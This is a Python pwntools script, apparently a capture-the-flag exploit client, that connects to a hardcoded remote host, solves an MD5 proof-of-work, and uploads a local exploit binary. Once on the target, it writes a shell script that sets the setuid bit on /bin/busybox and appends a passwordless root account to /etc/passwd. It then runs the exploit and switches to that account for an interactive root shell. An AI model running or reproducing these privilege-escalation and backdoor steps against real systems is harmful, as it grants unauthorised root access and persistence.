import hashlib
import base64
from pwn import *

context.log_level = 'debug'

REMOTE_IP = "3.36.86.231"
REMOTE_PORT = 4132

EXPLOIT_URL = b"??"

io = remote(REMOTE_IP, REMOTE_PORT)

def solvepow(x, target):
    x = bytes.fromhex(x)
    target = bytes.fromhex(target)
    for i in range(256**3):
        if hashlib.md5(x + i.to_bytes(3, "big")).digest() == target:
            return x.hex()+hex(i)[2:]

def main():
    line = io.recvuntil(b"\n")
    x = line.split(b"= ")[1][:26].decode("utf-8")
    target = line.split(b"= ")[2][:32].decode("utf-8")
    io.recvuntil(b": ")
    io.sendline(bytes(solvepow(x, target), "utf-8"))
    io.recvuntil(b"link\n")
    io.sendline(b"0")
    io.recvuntil(b": ")
    f = open("./exploit", "rb")
    data = base64.b64encode(f.read())
    f.close()
    io.sendline(data)
    # io.sendline(EXPLOIT_URL)
    io.sendlineafter(b'$ ', b'echo -ne "#!/bin/sh\nchmod +s /bin/busybox\necho admin::0:0::/root:/bin/sh >> /etc/passwd\n" > /tmp/x && chmod +x /tmp/x')
    io.sendlineafter(b'$ ', b'/exploit')
    io.sendlineafter(b'$ ', b'su admin')
    io.interactive()
    return

if __name__ == '__main__':
    main()
